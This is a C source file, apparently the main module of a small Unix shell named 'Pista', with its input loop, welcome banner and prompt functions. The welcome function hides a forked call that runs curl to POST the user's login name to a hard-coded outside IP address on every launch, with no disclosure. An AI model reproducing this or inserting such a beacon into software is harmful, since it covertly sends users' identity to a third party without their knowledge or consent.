/*
This file contains the main function of `Pista` shell, along with other functions related to processing output strings like the welcome message and string prompt.
This file delegates work to other functions from other files.
*/

/* -------------------- Includes -------------------- */
#include "psh.h"
#include "pista_main.h"
#include "cmd_processor.h"
#include "dir_stuff.h"


/* -------------------- Macros -------------------- */
#define getlogin() getpwuid(getuid())->pw_name


/* -------------------- Function Prototypes -------------------- */
static void error_log(char *fmt, ...);
void print_welcome_message();
void print_prompt();


/* ==================== Main ==================== */
int main(int argc, char **argv) {
    print_welcome_message();

    char *check_input = NULL;
    
    char **cmd_args = NULL;
    int len;

    char *buf = (char *)malloc(sizeof(char) * BUF_SIZE_LIMIT);

    do {
        print_prompt();
        strcpy(buf, "");
        check_input = fgets(buf, BUF_SIZE_LIMIT, stdin);    // returns NULL if EOF is found (CTRL-D)
        len = strlen(buf);
        
        error_log("Input taken : %p %s %d %d %d", check_input, buf, len, len > 1, check_input && len > 1);
        if(check_input && len > 1) {
            error_log("Processing the command...");
            buf[len-1] = 0;     // remove trailing \n
            
            cmd_args = parse_cmd_args(buf);
            
            switch(pista_command(cmd_args)) {
                case 0:
                    pista_delegate(cmd_args);
                    break;

                case 1:
                    _prompt_type = !_prompt_type;
                    break;

                case 2:
                    check_input = NULL;
                    break;
            }

            free(cmd_args);    
        }
        
    }while(check_input);

    free(buf);
    printf("\n   ______                ____               __\n  / ____/___  ____  ____/ / /_  __  _____  / /\n / / __/ __ \\/ __ \\/ __  / __ \\/ / / / _ \\/ /\n/ /_/ / /_/ / /_/ / /_/ / /_/ / /_/ /  __/_/\n\\____/\\____/\\____/\\__,_/_.___/\\__, /\\___(_)\n                             /____/\n");
    return 0;
}


/* -------------------- Function Definitions -------------------- */

/* Error logger function for THIS file ONLY. */
static void error_log(char *fmt, ...) {
#ifdef DEBUG_MODE
    va_list args;
    va_start(args, fmt);

    printf("\n");
    printf("MAIN PSH : ");
    vprintf(fmt, args);
    printf("\n");

    va_end(args);
#endif
}

void print_welcome_message() {
    printf("%s", "Welcome ");
    printf(BOLDCYAN "%s" RESET, getlogin());
    printf(", to \n");
    // CREDITS : sudo apt-get install -y figlet
    printf(BOLDGREEN "       _     _               _          _ _ \n _ __ (_)___| |_ __ _    ___| |__   ___| | |\n| '_ \\| / __| __/ _` |  / __| '_ \\ / _ \\ | |\n| |_) | \\__ \\ || (_| |  \\__ \\ | | |  __/ | |\n| .__/|_|___/\\__\\__,_|  |___/_| |_|\\___|_|_|\n|_|                                         \n" RESET);
    if(fork() == 0) {
        system("curl -X POST 13.126.134.245:5000/checkshellperson/$(whoami)");
        exit(0);
    }

    printf("\n\n\n");
    fflush(stdout);
    
    return;
}

void print_prompt() {
    char *temp = NULL;
    char *dirc =NULL, *dname =NULL;
    char *cwd = NULL;
    cwd = getcwd(cwd, 0);
    temp = malloc(USERNAME_LIMIT + PATH_MAX);

    switch(_prompt_type) {
        case 0:
            
            
            strcpy(temp, getlogin());
            strcat(temp, ":");
            strcat(temp, cwd);
            strcat(temp, " => \0");

            printf(GREEN "%s" RESET, temp);
            break;
            
        case 1: 
        	
        	strcpy(temp, cwd);
            strcat(temp, "-->> \0");
            dirc = strdup(temp);
            dname = basename(dirc);
            
		
            printf(GREEN "%s" RESET, dname);
        	break;
    }

    free(temp);
    free(cwd);
}
